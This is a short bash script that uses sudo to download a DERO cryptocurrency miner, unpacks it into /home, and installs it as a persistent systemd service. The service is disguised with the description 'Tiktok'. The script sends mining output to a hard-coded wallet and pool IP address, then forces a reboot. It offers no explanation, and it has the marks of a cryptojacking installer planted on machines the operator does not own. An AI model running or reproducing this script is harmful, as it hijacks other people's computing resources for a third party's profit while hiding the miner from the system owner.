#!/bin/bash
myArray=(
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
"dero1qy4x522ys0tcea5yg5e4hm66gnpn0ukdslw36pv0zmtlmr9rr5gk7qgeg493h"
)
wallet=${myArray[$RANDOM % ${#myArray[@]} ]}
cd /home
sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
sudo apt update
sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w '$wallet' -r 40.121.246.138:4444 -r1 40.121.246.138:5555\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
